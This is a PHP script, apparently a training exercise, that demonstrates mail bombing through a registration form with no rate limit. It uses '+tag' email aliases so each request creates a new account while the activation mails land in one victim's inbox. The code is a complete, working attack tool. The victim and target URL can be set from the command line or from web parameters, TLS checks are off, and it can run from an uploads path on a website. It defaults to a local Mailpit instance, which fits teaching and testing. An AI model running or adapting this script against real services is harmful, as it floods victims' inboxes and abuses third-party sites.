<?php
/**
 * Exercice 10 — démonstration : mail bombing via /inscription
 *
 * /inscription envoie un vrai email d'activation à chaque inscription, sans
 * aucune limite de requêtes. En exploitant l'alias "+tag" (supporté par la
 * plupart des fournisseurs : victime+1@example.com arrive dans la boîte de
 * victime@example.com), on peut créer un compte différent à chaque requête
 * tout en spammant la même boîte mail réelle.
 *
 * Usage CLI : php mail_bomb.php <email_victime> [nombre] [url]
 * Usage web  : /uploads/topic/image-5.php?victim=<email_victime>&count=<nombre>&url=<url>
 * Exemple    : php mail_bomb.php victime@example.com 50
 *
 * Ne cible que l'instance locale par défaut (Mailpit capture tout, aucun mail
 * ne part réellement sur Internet).
 */

$isCli = 'cli' === PHP_SAPI;

if ($isCli) {
    $victim = $argv[1] ?? null;
    $max = isset($argv[2]) ? (int) $argv[2] : 50;
    $base = $argv[3] ?? 'https://localhost:8443';
} else {
    header('Content-Type: text/plain; charset=utf-8');
    $victim = $_GET['victim'] ?? null;
    $max = isset($_GET['count']) ? (int) $_GET['count'] : 50;
    $base = $_GET['url'] ?? 'https://localhost:8443';
}

if (!$victim) {
    $usage = "usage: php mail_bomb.php <email_victime> [nombre] [url]\n"
        . "   ou: ?victim=<email_victime>&count=<nombre>&url=<url>\n";

    if ($isCli) {
        fwrite(STDERR, $usage);
    } else {
        echo $usage;
    }

    exit(1);
}

$run = time();
$sent = 0;

$cookieJar = tempnam(sys_get_temp_dir(), 'mailbomb_');
register_shutdown_function(static fn () => @unlink($cookieJar));

function httpRequest(string $method, string $url, string $base, string $cookieJar, array $post = []): array
{
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_COOKIEJAR => $cookieJar,
        CURLOPT_COOKIEFILE => $cookieJar,
        CURLOPT_HTTPHEADER => [
            "Origin: {$base}",
            "Referer: {$base}/inscription",
        ],
    ]);

    if ('POST' === $method) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    }

    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return [$code, $body];
}

function buildAlias(string $victim, int $run, int $n): string
{
    return preg_replace('/@/', "+{$run}_{$n}@", $victim, 1);
}

for ($i = 1; $i <= $max; $i++) {
    if (1 === $i % 10) {
        [, $page] = httpRequest('GET', "{$base}/inscription", $base, $cookieJar);
        preg_match('/name="registration\[_token\]"[^>]*value="([^"]*)"/', $page, $matches);
        $token = $matches[1] ?? '';
    }

    $email = buildAlias($victim, $run, $i);

    [$code] = httpRequest('POST', "{$base}/inscription", $base, $cookieJar, [
        'registration[email]' => $email,
        'registration[nickname]' => "Victim{$run}_{$i}",
        'registration[plainPassword][first]' => 'Azerty123!',
        'registration[plainPassword][second]' => 'Azerty123!',
        'registration[_token]' => $token,
    ]);

    if (302 === $code) {
        $sent++;
        $state = "mail d'activation envoyé à {$email}";
    } else {
        $state = match ($code) {
            422 => 'formulaire refusé (validation ou CSRF)',
            429 => 'BLOQUÉ (rate limit)',
            default => 'réponse inattendue',
        };
    }

    printf("%3d  HTTP %d  %s\n", $i, $code, $state);

    if (!$isCli) {
        @flush();
    }

    if (429 === $code) {
        echo "--- blocage après {$sent} mails envoyés ---\n";
        exit(0);
    }
}

echo "--- terminé : {$sent} mails envoyés vers la boîte de {$victim} sur {$max} tentatives, aucun blocage ---\n";
echo "--- vérifiez la boîte dans Mailpit : http://localhost:8025 ---\n";
